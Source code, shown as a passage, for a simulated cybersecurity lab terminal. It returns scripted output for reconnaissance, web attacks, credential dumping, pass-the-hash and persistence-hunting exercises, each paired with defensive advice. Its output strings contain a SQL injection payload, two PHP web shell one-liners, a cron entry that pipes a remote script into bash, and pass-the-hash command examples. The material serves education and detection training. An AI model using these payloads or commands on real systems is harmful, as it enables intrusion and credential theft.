/**
 * Advanced commands for Phase 3 lab scenarios.
 * All output is educational simulation — no real network activity occurs.
 */
import type { Scenario, CommandResult } from '@/types'

const c = {
  reset: '\x1b[0m', bold: '\x1b[1m',
  green: '\x1b[32m', brightGreen: '\x1b[92m',
  red: '\x1b[31m', brightRed: '\x1b[91m',
  yellow: '\x1b[33m', brightYellow: '\x1b[93m',
  blue: '\x1b[34m', brightBlue: '\x1b[94m',
  cyan: '\x1b[36m', brightCyan: '\x1b[96m',
  gray: '\x1b[90m', white: '\x1b[97m',
  magenta: '\x1b[35m', brightMagenta: '\x1b[95m',
}

// ──────────────────────────────────────────────────────────────────────────────
// SCENARIO 01 — DNS Recon
// ──────────────────────────────────────────────────────────────────────────────

export function cmdDigAxfr(args: string[], scenario: Scenario | null): CommandResult {
  const domain = args.find(a => !a.startsWith('-') && a !== 'AXFR' && a !== 'axfr') ?? 'target.local'

  // Check scenario context
  const dnsHost = scenario?.network.find(h =>
    h.services.some(s => s.name === 'dns')
  )

  if (!dnsHost) {
    return {
      output: `${c.red}; Transfer failed. SERVFAIL${c.reset}\n${c.gray}No DNS server found in current scenario.${c.reset}`,
      error: true,
    }
  }

  return {
    output: `
${c.bold}; <<>> DiG 9.18.1 <<>> AXFR ${domain} @${dnsHost.ip}${c.reset}
${c.gray};; global options: +cmd${c.reset}

${c.brightGreen}; Zone transfer successful! Misconfigured nameserver allowed AXFR.${c.reset}
${c.gray}${domain}.          3600  IN  SOA   ns1.${domain}. admin.${domain}. 2024010101 3600 900 604800 86400${c.reset}

${c.brightBlue}ns1.${domain}.       3600  IN  A     ${dnsHost.ip}${c.reset}
${c.brightBlue}www.${domain}.       300   IN  A     ${scenario?.network[1]?.ip ?? '10.0.2.10'}${c.reset}
${c.brightBlue}mail.${domain}.      300   IN  A     10.0.2.25${c.reset}
${c.brightBlue}vpn.${domain}.       300   IN  A     10.0.2.30${c.reset}
${c.brightBlue}dev.${domain}.       300   IN  A     10.0.2.40${c.reset}
${c.brightBlue}staging.${domain}.   300   IN  A     10.0.2.50${c.reset}
${c.brightBlue}db.${domain}.        300   IN  A     10.0.2.60${c.reset}
${c.brightBlue}admin.${domain}.     300   IN  A     10.0.2.70${c.reset}
${c.red}backup.${domain}.    300   IN  A     10.0.2.80  ${c.gray}; OLD BACKUP — NOT PATCHED${c.reset}
${c.red}legacy.${domain}.    300   IN  A     10.0.2.90  ${c.gray}; LEGACY SYSTEM — EOL SOFTWARE${c.reset}

${c.gray}${domain}.          3600  IN  SOA   ns1.${domain}. admin.${domain}. 2024010101 3600 900 604800 86400${c.reset}

${c.gray};; XFR size: 12 records (messages 1, bytes 842)
;; Query time: 3 msec
;; SERVER: ${dnsHost.ip}#53(${dnsHost.ip}) (TCP)${c.reset}

${c.yellow}💡 Zone Transfer (AXFR):${c.reset} ${c.gray}A misconfigured DNS server just handed us
   the ENTIRE internal DNS map. This is like getting a complete blueprint
   of the network — every host, every IP. Attackers love this.
   ${c.brightRed}Notice "backup" and "legacy" hosts — unpatched systems are prime targets.${c.reset}
${c.gray}   ${c.brightCyan}Defense:${c.reset}${c.gray} Restrict AXFR to authorized secondary DNS servers only.
   Add ACLs: allow-transfer { secondary-ip; }; in named.conf${c.reset}`,
    objectivesCompleted: ['obj-axfr', 'obj-discover-subdomains'],
  }
}

export function cmdSubfinder(args: string[], scenario: Scenario | null): CommandResult {
  const domain = args.find(a => !a.startsWith('-') && a !== '-d') ?? 'target.local'

  const subs = [
    'www', 'mail', 'vpn', 'dev', 'staging', 'api', 'admin',
    'portal', 'remote', 'git', 'jira', 'confluence',
  ]

  const lines = [
    '',
    `${c.bold}${c.brightCyan}subfinder${c.reset} ${c.gray}v2.6.3${c.reset}`,
    `${c.gray}Running passive subdomain enumeration for ${domain}...${c.reset}`,
    '',
  ]

  subs.forEach(sub => {
    const ip = scenario?.network.find(h => h.hostname?.startsWith(sub))?.ip
      ?? `10.0.2.${Math.floor(Math.random() * 200) + 10}`
    lines.push(`${c.green}[subfinder]${c.reset} ${c.brightBlue}${sub}.${domain}${c.reset} ${c.gray}→ ${ip}${c.reset}`)
  })

  lines.push('')
  lines.push(`${c.gray}Found ${subs.length} subdomains. Time: 4.2s${c.reset}`)
  lines.push('')
  lines.push(`${c.yellow}💡 Passive Subdomain Enumeration:${c.reset} ${c.gray}Subfinder queries certificate transparency logs,`)
  lines.push(`   DNS aggregators, and OSINT sources — without ever touching the target.`)
  lines.push(`   ${c.brightCyan}Defense:${c.reset}${c.gray} Register a wildcard cert to reduce CT log exposure. Monitor CT logs for your domain.${c.reset}`)

  return { output: lines.join('\r\n'), objectivesCompleted: ['obj-subdomain-enum'] }
}

export function cmdGobusterDns(args: string[], scenario: Scenario | null): CommandResult {
  const domain = args.find(a => !a.startsWith('-') && a !== '-d' && a !== 'dns') ?? 'target.local'

  const found = ['www', 'mail', 'vpn', 'api', 'admin', 'dev', 'staging', 'backup', 'legacy']

  const lines = [
    '',
    `${c.bold}${c.brightCyan}Gobuster${c.reset} ${c.gray}v3.6.0${c.reset}`,
    `${c.gray}Mode: DNS | Domain: ${domain} | Wordlist: /usr/share/wordlists/subdomains-top1million.txt${c.reset}`,
    `${c.gray}Threads: 10 | Timeout: 1s${c.reset}`,
    '',
    `${c.gray}===============================================================${c.reset}`,
    `${c.gray}Starting Gobuster at ${new Date().toISOString()}${c.reset}`,
    `${c.gray}===============================================================${c.reset}`,
    '',
  ]

  found.forEach(sub => {
    const ip = scenario?.network.find(h => h.hostname?.includes(sub))?.ip
      ?? `10.0.2.${Math.floor(Math.random() * 200) + 10}`
    lines.push(`${c.green}Found:${c.reset} ${c.brightBlue}${sub}.${domain}${c.reset} ${c.gray}[${ip}]${c.reset}`)
  })

  lines.push('')
  lines.push(`${c.gray}Finished: ${found.length} subdomains found${c.reset}`)
  lines.push('')
  lines.push(`${c.yellow}💡 DNS Brute Force:${c.reset} ${c.gray}Gobuster tries wordlist entries as subdomains.`)
  lines.push(`   Unlike subfinder, this is active (sends DNS queries) — more detectable.`)
  lines.push(`   ${c.brightCyan}Defense:${c.reset}${c.gray} DNS rate limiting + logging unusual query volumes.${c.reset}`)

  return { output: lines.join('\r\n'), objectivesCompleted: ['obj-dns-brute'] }
}

// ──────────────────────────────────────────────────────────────────────────────
// SCENARIO 02 — Web App Attacks
// ──────────────────────────────────────────────────────────────────────────────

export function cmdSqlmap(args: string[], _scenario: Scenario | null): CommandResult {
  const urlArg = args.find(a => a.startsWith('http') || a.includes('10.0'))
  const url = urlArg ?? 'http://10.0.2.10/login.php'

  const lines = [
    '',
    `${c.bold}${c.brightRed}sqlmap${c.reset} ${c.gray}v1.7.8${c.reset} ${c.yellow}#TIP: Use responsibly — educational simulation only${c.reset}`,
    `${c.gray}[*] starting @ ${new Date().toISOString()}${c.reset}`,
    `${c.gray}[*] testing URL: ${url}${c.reset}`,
    '',
    `${c.gray}[INFO] testing if the target URL is stable${c.reset}`,
    `${c.gray}[INFO] target URL appears to be dynamic${c.reset}`,
    `${c.yellow}[INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable${c.reset}`,
    `${c.gray}[INFO] testing for SQL injection on GET parameter 'id'${c.reset}`,
    '',
    `${c.red}[CRITICAL] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable${c.reset}`,
    `${c.red}[CRITICAL] GET parameter 'id' appears to be 'MySQL UNION-based' injectable${c.reset}`,
    '',
    `${c.gray}---${c.reset}`,
    `${c.brightGreen}Parameter: id (GET)${c.reset}`,
    `${c.gray}    Type: time-based blind${c.reset}`,
    `${c.gray}    Title: MySQL >= 5.0.12 AND time-based blind${c.reset}`,
    `${c.gray}    Payload: id=1 AND SLEEP(5)${c.reset}`,
    '',
    `${c.gray}    Type: UNION query${c.reset}`,
    `${c.gray}    Title: MySQL UNION query (NULL) - 3 columns${c.reset}`,
    `${c.gray}    Payload: id=-1 UNION ALL SELECT NULL,NULL,CONCAT(0x71,username,0x3a,password,0x71) FROM users-- -${c.reset}`,
    `${c.gray}---${c.reset}`,
    '',
    `${c.brightGreen}[*] Dumped database users:${c.reset}`,
    `${c.green}admin${c.reset}${c.gray}:${c.reset}${c.red}5f4dcc3b5aa765d61d8327deb882cf99${c.reset} ${c.gray}(MD5: "password")${c.reset}`,
    `${c.green}webmaster${c.reset}${c.gray}:${c.reset}${c.red}e10adc3949ba59abbe56e057f20f883e${c.reset} ${c.gray}(MD5: "123456")${c.reset}`,
    '',
    `${c.yellow}💡 SQL Injection:${c.reset} ${c.gray}The app concatenated user input directly into SQL.`,
    `   An attacker extracted the entire users table including password hashes.`,
    `   ${c.brightCyan}Defense:${c.reset}${c.gray} Use parameterized queries / prepared statements. NEVER concatenate user input into SQL.`,
    `   Vulnerable: "SELECT * FROM users WHERE id=" + userId`,
    `   Safe:       "SELECT * FROM users WHERE id=?" with binding.${c.reset}`,
  ]

  return { output: lines.join('\r\n'), objectivesCompleted: ['obj-sqli', 'obj-dump-creds'] }
}

export function cmdNikto(args: string[], _scenario: Scenario | null): CommandResult {
  const target = args.find(a => !a.startsWith('-') && a !== '-h') ?? '10.0.2.10'

  const lines = [
    '',
    `${c.bold}${c.brightCyan}- Nikto v2.1.6${c.reset}`,
    `${c.gray}+ Target IP:          ${target}${c.reset}`,
    `${c.gray}+ Target Hostname:    webapp.target.local${c.reset}`,
    `${c.gray}+ Target Port:        80${c.reset}`,
    `${c.gray}+ Start Time:         ${new Date().toISOString()}${c.reset}`,
    `${c.gray}+ Server: Apache/2.4.41 (Ubuntu)${c.reset}`,
    '',
    `${c.yellow}+ /admin/: Admin login page found.${c.reset}`,
    `${c.yellow}+ /backup/: Backup directory found. Listing enabled.${c.reset}`,
    `${c.yellow}+ /config.php.bak: PHP backup file found — may contain credentials!${c.reset}`,
    `${c.red}+ /upload.php: File upload script found.${c.reset}`,
    `${c.yellow}+ /phpinfo.php: phpinfo() output exposed — information disclosure.${c.reset}`,
    `${c.yellow}+ X-Frame-Options header not set (clickjacking risk).${c.reset}`,
    `${c.yellow}+ X-Content-Type-Options header not set (MIME sniffing risk).${c.reset}`,
    `${c.red}+ OSVDB-877: HTTP TRACE method active — XST attack possible.${c.reset}`,
    `${c.red}+ OSVDB-3092: /phpmyadmin/: phpMyAdmin found! Database administration exposed.${c.reset}`,
    '',
    `${c.gray}+ 1 host(s) tested | End Time: ${new Date().toISOString()}${c.reset}`,
    '',
    `${c.yellow}💡 Web Scanner:${c.reset} ${c.gray}Nikto found multiple vulnerabilities in minutes.`,
    `   The file upload script (/upload.php) is the most critical — attackers use these to plant web shells.`,
    `   ${c.brightCyan}Defense:${c.reset}${c.gray} Remove backup files, disable directory listing, restrict upload endpoints.${c.reset}`,
  ]

  return { output: lines.join('\r\n'), objectivesCompleted: ['obj-nikto', 'obj-find-upload'] }
}

export function cmdDirb(args: string[], _scenario: Scenario | null): CommandResult {
  const target = args.find(a => a.startsWith('http') || a.includes('10.0')) ?? 'http://10.0.2.10'
  const dirs = [
    { path: '/admin', code: 200 }, { path: '/backup', code: 200 },
    { path: '/upload', code: 200 }, { path: '/config', code: 403 },
    { path: '/phpmyadmin', code: 200 }, { path: '/api', code: 200 },
    { path: '/login.php', code: 200 }, { path: '/register.php', code: 200 },
  ]

  const lines = [
    '',
    `${c.bold}DIRB v2.22${c.reset}`,
    `${c.gray}By The Dark Raver${c.reset}`,
    `${c.gray}START_TIME: ${new Date().toISOString()}${c.reset}`,
    `${c.gray}URL_BASE: ${target}/${c.reset}`,
    `${c.gray}WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt${c.reset}`,
    '',
    `${c.gray}GENERATED WORDS: 4612${c.reset}`,
    '',
    `${c.gray}---- Scanning URL: ${target}/ ----${c.reset}`,
  ]

  dirs.forEach(d => {
    const color = d.code === 200 ? c.brightGreen : c.yellow
    lines.push(`${color}+ ${target}${d.path} (CODE:${d.code}|SIZE:1234)${c.reset}`)
  })

  lines.push('')
  lines.push(`${c.gray}END_TIME: ${new Date().toISOString()}${c.reset}`)
  lines.push(`${c.gray}DOWNLOADED: 4612 | FOUND: ${dirs.length}${c.reset}`)

  return { output: lines.join('\r\n'), objectivesCompleted: ['obj-dirb'] }
}

export function cmdUpload(args: string[], _scenario: Scenario | null): CommandResult {
  const file = args[0] ?? 'shell.php'
  const endpoint = args[1] ?? '/upload.php'

  const isShell = file.includes('.php') || file.includes('.phtml') || file.includes('.php5')

  if (!isShell) {
    return {
      output: `${c.gray}Uploading ${file} to ${endpoint}...${c.reset}\n${c.green}Upload successful: ${endpoint.replace(/\/$/, '')}/${file}${c.reset}`,
    }
  }

  return {
    output: `
${c.gray}Uploading ${file} to ${endpoint}...${c.reset}

${c.yellow}[*] Bypass attempt: changing Content-Type to image/jpeg${c.reset}
${c.yellow}[*] Server accepted the file (weak validation — only checks MIME type, not content)${c.reset}

${c.brightGreen}[+] Upload successful: http://10.0.2.10/uploads/${file}${c.reset}

${c.brightRed}[+] Testing webshell execution:${c.reset}
${c.gray}curl "http://10.0.2.10/uploads/${file}?cmd=id"${c.reset}
${c.green}uid=33(www-data) gid=33(www-data) groups=33(www-data)${c.reset}

${c.brightRed}[!] WEB SHELL ACTIVE${c.reset} ${c.gray}— attacker now has remote code execution as www-data${c.reset}

${c.yellow}💡 File Upload Attack:${c.reset} ${c.gray}The server only validated the MIME type (easily spoofed),
   not the actual file content. A PHP file disguised as an image got through.
   ${c.brightCyan}Defense:${c.reset}${c.gray} Validate file content (magic bytes), store uploads OUTSIDE web root,
   use a CDN/object store for uploads, rename files on upload, disable PHP execution in upload dirs.${c.reset}`,
    objectivesCompleted: ['obj-upload-shell', 'obj-rce'],
  }
}

// ──────────────────────────────────────────────────────────────────────────────
// SCENARIO 03 — Persistence Hunting (defensive mode — you're the defender)
// ──────────────────────────────────────────────────────────────────────────────

export function cmdFind(args: string[], _scenario: Scenario | null): CommandResult {
  const argStr = args.join(' ')
  const isWebshellHunt = argStr.includes('.php') || argStr.includes('web')
  const isWritable = argStr.includes('-perm') && (argStr.includes('777') || argStr.includes('0777'))

  if (isWebshellHunt) {
    return {
      output: `
${c.gray}Searching for PHP files modified in the last 24 hours...${c.reset}

${c.red}/var/www/html/uploads/img_20240312.php${c.reset}   ${c.yellow}← SUSPICIOUS: uploaded 2024-03-12 02:14:33${c.reset}
${c.red}/var/www/html/admin/cache.php${c.reset}            ${c.yellow}← SUSPICIOUS: 1-line PHP, modified today${c.reset}
${c.red}/var/www/html/.htaccess.php${c.reset}              ${c.yellow}← SUSPICIOUS: hidden file with .php extension${c.reset}
/var/www/html/index.php              (normal — matches CMS version)
/var/www/html/wp-login.php          (normal — WordPress login)

${c.yellow}💡 Found 3 suspicious PHP files. Examine them with: cat <path>${c.reset}
${c.gray}   Attackers often name web shells to mimic legitimate files.
   Look for: very small file size, obfuscated code, eval(base64_decode(...))${c.reset}`,
      objectivesCompleted: ['obj-find-shells'],
    }
  }

  if (isWritable) {
    return {
      output: `
${c.gray}World-writable files and directories:${c.reset}

${c.red}drwxrwxrwx  /var/www/html/uploads/${c.reset}
${c.red}drwxrwxrwx  /tmp/${c.reset}
${c.red}-rwxrwxrwx  /var/www/html/admin/debug.php${c.reset}
${c.yellow}drwxrwxr-x  /var/log/apache2/${c.reset}

${c.yellow}💡 World-writable paths${c.reset} ${c.gray}are where attackers plant files.
   ${c.brightCyan}Defense:${c.reset}${c.gray} Only the web server user should write to upload dirs. Use chmod 750.${c.reset}`,
    }
  }

  return {
    output: `${c.gray}No matching files found. Try:${c.reset}
  ${c.brightBlue}find /var/www -name "*.php" -mtime -1${c.reset}  ${c.gray}(PHP files modified in last 24h)${c.reset}
  ${c.brightBlue}find / -perm -0777 -type f 2>/dev/null${c.reset}  ${c.gray}(world-writable files)${c.reset}`,
  }
}

export function cmdGrep(args: string[], _scenario: Scenario | null): CommandResult {
  const argStr = args.join(' ')
  const isEvalSearch = argStr.includes('eval') || argStr.includes('base64')

  if (isEvalSearch) {
    return {
      output: `
${c.gray}Searching for obfuscated PHP in web root...${c.reset}

${c.red}/var/www/html/uploads/img_20240312.php${c.reset}${c.gray}:1:${c.reset}
  ${c.red}<?php eval(base64_decode("cGFzc3RocnUoJF9HRVRbJ2NtZCddKTs=")); ?>${c.reset}
  ${c.gray}# Decoded: passthru(\$_GET['cmd']);  ← simple one-liner web shell${c.reset}

${c.red}/var/www/html/admin/cache.php${c.reset}${c.gray}:3:${c.reset}
  ${c.red}<?php if(md5(\$_POST['p'])=='5f4dcc3b5aa765d61d8327deb882cf99'){system(\$_POST['c']);}?>${c.reset}
  ${c.gray}# Password-protected shell (password: "password")${c.reset}

${c.yellow}💡 Web Shell Detection:${c.reset} ${c.gray}These two files are definitive web shells.
   Both use eval/system to run OS commands from HTTP parameters.
   ${c.brightCyan}Defense:${c.reset}${c.gray} Use: grep -r "eval(base64" /var/www as a quick forensic check.
   SIEM rule: alert on requests to /uploads/*.php${c.reset}`,
      objectivesCompleted: ['obj-grep-shells'],
    }
  }

  return {
    output: `${c.gray}Usage: grep -r "eval" /var/www/html${c.reset}\n${c.gray}Try searching for obfuscated code: grep -r "eval(base64" /var/www${c.reset}`,
  }
}

export function cmdNetstat(__args: string[], _scenario: Scenario | null): CommandResult {
  return {
    output: `
${c.gray}Active Internet connections (servers and established)${c.reset}
${c.gray}Proto  Local Address          Foreign Address        State${c.reset}
${c.green}tcp    0.0.0.0:22             0.0.0.0:*              LISTEN${c.reset}
${c.green}tcp    0.0.0.0:80             0.0.0.0:*              LISTEN${c.reset}
${c.green}tcp    0.0.0.0:443            0.0.0.0:*              LISTEN${c.reset}
${c.green}tcp    0.0.0.0:3306           0.0.0.0:*              LISTEN${c.reset}
${c.red}tcp    0.0.0.0:4444           0.0.0.0:*              LISTEN${c.reset}   ${c.yellow}← SUSPICIOUS: reverse shell port!${c.reset}
${c.red}tcp    127.0.0.1:8080         0.0.0.0:*              LISTEN${c.reset}   ${c.yellow}← SUSPICIOUS: local C2 listener?${c.reset}
${c.green}tcp    10.0.3.10:80           185.220.101.42:54312   ESTABLISHED${c.reset}
${c.red}tcp    10.0.3.10:4444         45.33.32.156:9001      ESTABLISHED${c.reset}  ${c.yellow}← ACTIVE C2 CONNECTION${c.reset}

${c.red}[!] Port 4444 is a classic Metasploit reverse shell port.${c.reset}
${c.red}[!] Active outbound connection to 45.33.32.156 — known Tor exit node.${c.reset}

${c.yellow}💡 Network Indicators:${c.reset} ${c.gray}Unexpected LISTEN ports and outbound connections to unknown IPs
   are key persistence indicators. Check with: ss -tnp or netstat -anp.
   ${c.brightCyan}Defense:${c.reset}${c.gray} Baseline your normal network connections. Alert on new LISTEN ports.${c.reset}`,
    objectivesCompleted: ['obj-netstat'],
  }
}

export function cmdCrontab(args: string[], _scenario: Scenario | null): CommandResult {
  const isList = args.includes('-l') || args.length === 0

  if (!isList) return { output: `${c.gray}Usage: crontab -l  (list scheduled tasks)${c.reset}` }

  return {
    output: `
${c.gray}# Cron jobs for root${c.reset}
${c.green}*/5 * * * * /usr/bin/php /var/www/html/cron_maintenance.php${c.reset}   ${c.gray}(legitimate)${c.reset}
${c.green}0 2 * * * /usr/bin/find /tmp -mtime +7 -delete${c.reset}              ${c.gray}(legitimate cleanup)${c.reset}
${c.red}* * * * * curl -s http://45.33.32.156/beacon.sh | bash${c.reset}        ${c.yellow}← MALICIOUS: downloads & executes remote script every minute!${c.reset}
${c.red}@reboot /tmp/.systemd-private-cache 2>/dev/null &${c.reset}             ${c.yellow}← MALICIOUS: hidden file in /tmp runs at startup${c.reset}

${c.red}[!] PERSISTENCE FOUND: 2 malicious cron entries${c.reset}

${c.yellow}💡 Cron Persistence:${c.reset} ${c.gray}Cron is a classic persistence mechanism.
   The malicious entry downloads and pipes to bash — a fileless technique.
   The @reboot entry runs a hidden binary from /tmp.
   ${c.brightCyan}Defense:${c.reset}${c.gray} Monitor crontab changes (auditd). Alert on: curl|wget ... | bash patterns.${c.reset}`,
    objectivesCompleted: ['obj-crontab', 'obj-find-persistence'],
  }
}

export function cmdRemoveShell(args: string[], _scenario: Scenario | null): CommandResult {
  const target = args[0]

  if (!target) {
    return {
      output: `${c.red}Usage: remove-shell <path>${c.reset}\n${c.gray}Example: remove-shell /var/www/html/uploads/img_20240312.php${c.reset}`,
      error: true,
    }
  }

  const knownShells = [
    '/var/www/html/uploads/img_20240312.php',
    '/var/www/html/admin/cache.php',
    '/var/www/html/.htaccess.php',
  ]

  if (!knownShells.some(s => target.includes(s.split('/').pop()!))) {
    return {
      output: `${c.yellow}rm: ${target}: File not found or already removed.${c.reset}`,
    }
  }

  return {
    output: `
${c.green}[+] Removed: ${target}${c.reset}
${c.gray}Checking for additional indicators...${c.reset}

${c.yellow}⚠  Remember: removing the shell doesn't close the backdoor!${c.reset}
${c.gray}   • Attacker may have:
     - Created additional shells in other locations
     - Added SSH authorized_keys backdoor
     - Modified legitimate files to include shell code
     - Set up cron-based re-deployment

   ${c.brightCyan}Next steps:${c.reset}${c.gray}
   1. Check crontab -l for re-deployment crons
   2. grep -r "eval" /var/www for other shells
   3. Rotate all credentials (DB, SSH keys, API tokens)
   4. Consider full server rebuild for high-confidence cleanup${c.reset}`,
    objectivesCompleted: ['obj-remove-shell'],
  }
}

// ──────────────────────────────────────────────────────────────────────────────
// SCENARIO 04 — Lateral Movement
// ──────────────────────────────────────────────────────────────────────────────

export function cmdMimikatz(args: string[], _scenario: Scenario | null): CommandResult {
  const subcmd = args[0]?.toLowerCase()

  if (subcmd === 'sekurlsa::logonpasswords' || args.includes('logonpasswords')) {
    return {
      output: `
${c.brightRed}  .#####.   mimikatz 2.2.0 (x64) #19041${c.reset}
${c.brightRed} .## ^ ##.  "A La Vie, A L'Amour"${c.reset}
${c.brightRed} ## / \\ ##  /*** Benjamin DELPY \`gentilkiwi\` ***/\n${c.reset}

${c.gray}mimikatz # sekurlsa::logonpasswords${c.reset}

${c.gray}Authentication Id : 0 ; 996 (00000000:000003e4)${c.reset}
${c.gray}Session           : Service from 0${c.reset}
${c.gray}User Name         : svcWebApp${c.reset}
${c.gray}Domain            : ACME${c.reset}
${c.gray}Logon Server      : DC01${c.reset}
${c.gray}Logon Time        : 2024-03-12 08:14:22${c.reset}
${c.brightGreen}         * Username : svcWebApp${c.reset}
${c.brightGreen}         * Domain   : ACME${c.reset}
${c.brightGreen}         * Password : S3rvice@2024!${c.reset}
${c.red}         * NTLM     : aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4${c.reset}

${c.gray}Authentication Id : 0 ; 1284 (00000000:00000504)${c.reset}
${c.gray}User Name         : jsmith (Domain Admin)${c.reset}
${c.gray}Domain            : ACME${c.reset}
${c.brightGreen}         * Username : jsmith${c.reset}
${c.brightGreen}         * Password : W1nter2024$$${c.reset}
${c.red}         * NTLM     : aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c${c.reset}

${c.red}[!] Domain Admin credentials dumped from LSASS memory!${c.reset}

${c.yellow}💡 LSASS Dumping:${c.reset} ${c.gray}Mimikatz reads Windows credentials from LSASS process memory.
   Both cleartext passwords AND NTLM hashes can be extracted.
   NTLM hashes can be used in pass-the-hash attacks WITHOUT cracking.
   ${c.brightCyan}Defense:${c.reset}${c.gray} Enable Credential Guard, configure Protected Users group,
   enable LSA protection: HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\RunAsPPL = 1${c.reset}`,
      objectivesCompleted: ['obj-dump-lsass', 'obj-get-hash'],
    }
  }

  return {
    output: `${c.gray}mimikatz # ${c.reset}${c.yellow}Try: mimikatz sekurlsa::logonpasswords${c.reset}`,
  }
}

export function cmdCrackMapExec(args: string[], scenario: Scenario | null): CommandResult {
  const target = args.find(a => a.match(/^\d+\.\d+\.\d+/) || a.includes('/'))
    ?? scenario?.network[0]?.ip ?? '10.0.4.0/24'

  const lines = [
    '',
    `${c.bold}${c.brightCyan}CrackMapExec${c.reset} ${c.gray}v5.4.0${c.reset}`,
    '',
    `${c.gray}SMB   ${target}  445  DC01  [*] Windows Server 2019 Build 17763 (name:DC01) (domain:ACME) (signing:True) (SMBv1:False)${c.reset}`,
  ]

  const isHash = args.includes('-H') || args.includes('--hash')
  const hashVal = isHash ? args[args.indexOf('-H') + 1] ?? '8846f7eaee8fb117ad06bdd830b7586c' : null

  if (hashVal) {
    lines.push(`${c.red}SMB   ${target}  445  DC01  [+] ACME\\jsmith:${hashVal} (Pwn3d!)${c.reset}`)
    lines.push(`${c.brightGreen}SMB   ${target}  445  DC01  [+] Executed command via SMBExec${c.reset}`)
    lines.push(`${c.green}SMB   ${target}  445  DC01  whoami${c.reset}`)
    lines.push(`${c.green}nt authority\\system${c.reset}`)
    lines.push('')
    lines.push(`${c.red}[!] Pass-the-Hash successful — SYSTEM shell on Domain Controller${c.reset}`)
    lines.push('')
    lines.push(`${c.yellow}💡 Pass-the-Hash:${c.reset} ${c.gray}Windows authentication accepts NTLM hashes directly.`)
    lines.push(`   No password cracking needed — the hash IS the credential.`)
    lines.push(`   ${c.brightCyan}Defense:${c.reset}${c.gray} Disable NTLM where possible, enable SMB signing, use Tiered Administration model.${c.reset}`)

    return { output: lines.join('\r\n'), objectivesCompleted: ['obj-pth', 'obj-dc-access'] }
  }

  lines.push(`${c.gray}SMB   ${target}  445  DC01  [-] ACME\\jsmith:<hash> STATUS_LOGON_FAILURE${c.reset}`)
  lines.push('')
  lines.push(`${c.gray}Tip: Use -H <NTLM-hash> to attempt pass-the-hash.${c.reset}`)
  lines.push(`${c.gray}Example: crackmapexec smb ${target} -u jsmith -H 8846f7eaee8fb117ad06bdd830b7586c${c.reset}`)

  return { output: lines.join('\r\n') }
}

export function cmdPassTheHash(args: string[], scenario: Scenario | null): CommandResult {
  const user = args[0] ?? 'jsmith'
  const hash = args[1] ?? '8846f7eaee8fb117ad06bdd830b7586c'
  const dc = scenario?.network.find(h => h.services.some(s => s.name === 'kerberos' || s.name === 'ldap'))

  return {
    output: `
${c.gray}[*] Attempting pass-the-hash for ${user} against ${dc?.ip ?? '10.0.4.20'}${c.reset}

${c.gray}[*] Using Impacket's wmiexec.py with NTLM hash${c.reset}
${c.gray}[*] NTLM Hash: ${hash}${c.reset}
${c.gray}[*] SMB Connection to ${dc?.ip ?? '10.0.4.20'}:445...${c.reset}

${c.brightGreen}[+] Authenticated as ACME\\${user} (Domain Admin)${c.reset}
${c.brightGreen}[+] Executing: cmd.exe${c.reset}

${c.green}C:\\Windows\\system32> whoami${c.reset}
${c.green}acme\\${user}${c.reset}

${c.green}C:\\Windows\\system32> net group "Domain Admins"${c.reset}
${c.gray}Group name     Domain Admins${c.reset}
${c.gray}Members:  Administrator  jsmith  svcBackup${c.reset}

${c.red}[!] Full Domain Admin access achieved via Pass-the-Hash!${c.reset}

${c.yellow}💡 PtH Attack:${c.reset} ${c.gray}Windows NTLM auth sends a challenge-response using the hash.
   Attackers replay the captured hash without ever knowing the password.
   This is why "reset the password" doesn't always stop an attacker —
   they already have the hash from memory.
   ${c.brightCyan}Defense:${c.reset}${c.gray} Privileged Access Workstations (PAW), Credential Guard, LAPS.${c.reset}`,
    objectivesCompleted: ['obj-pth', 'obj-domain-admin'],
  }
}

export function cmdNetUser(args: string[], _scenario: Scenario | null): CommandResult {
  const argStr = args.join(' ')

  if (argStr.includes('/domain') || argStr.includes('Domain Admins')) {
    return {
      output: `
${c.gray}The request will be processed at the domain controller for domain ACME.local.${c.reset}

${c.gray}Group name     Domain Admins${c.reset}
${c.gray}Comment        Designated administrators of the domain${c.reset}
${c.gray}Members${c.reset}

${c.green}Administrator            jsmith                   svcBackup${c.reset}
${c.red}backdoor_svc${c.reset}             ${c.yellow}← SUSPICIOUS: this account didn't exist before the breach!${c.reset}

${c.gray}The command completed successfully.${c.reset}

${c.red}[!] Unknown domain admin account "backdoor_svc" detected — attacker persistence!${c.reset}

${c.yellow}💡 Backdoor Accounts:${c.reset} ${c.gray}Attackers create new admin accounts for persistent access.
   Salt Typhoon created privilege-15 accounts on Cisco devices via CVE-2023-20198.
   ${c.brightCyan}Defense:${c.reset}${c.gray} Alert on new admin account creation. Review Domain Admins regularly.${c.reset}`,
      objectivesCompleted: ['obj-enum-domain'],
    }
  }

  return {
    output: `${c.gray}Usage: net user /domain  or  net group "Domain Admins" /domain${c.reset}`,
  }
}

// ──────────────────────────────────────────────────────────────────────────────
// SCENARIO 05 — SOC Analyst
// ──────────────────────────────────────────────────────────────────────────────

const SOC_LOGS = `
${c.gray}2024-03-12 01:47:22 WARN  auth     10.0.5.100 → 10.0.5.20: SSH FAILED (invalid key) user=admin${c.reset}
${c.gray}2024-03-12 01:47:23 WARN  auth     10.0.5.100 → 10.0.5.20: SSH FAILED (invalid key) user=admin${c.reset}
${c.gray}2024-03-12 01:47:24 WARN  auth     10.0.5.100 → 10.0.5.20: SSH FAILED (invalid key) user=admin${c.reset}
${c.yellow}2024-03-12 01:47:31 WARN  auth     10.0.5.100 → 10.0.5.20: SSH SUCCESS user=admin${c.reset}
${c.gray}2024-03-12 01:49:05 INFO  process  [10.0.5.20] nmap -sV 10.0.5.0/24 spawned by admin${c.reset}
${c.red}2024-03-12 01:52:18 CRIT  network  10.0.5.20 → 10.0.5.30: NEW SMB connection (admin)${c.reset}
${c.red}2024-03-12 01:53:44 CRIT  process  [10.0.5.30] wmiexec spawned cmd.exe (NTLM auth from 10.0.5.20)${c.reset}
${c.red}2024-03-12 01:55:01 CRIT  process  [10.0.5.30] reg.exe SAVE hklm\\sam → C:\\temp\\sam.hive${c.reset}
${c.red}2024-03-12 01:57:43 CRIT  network  10.0.5.30 → 45.33.32.156:443 OUTBOUND (encrypted, 1.2GB)${c.reset}
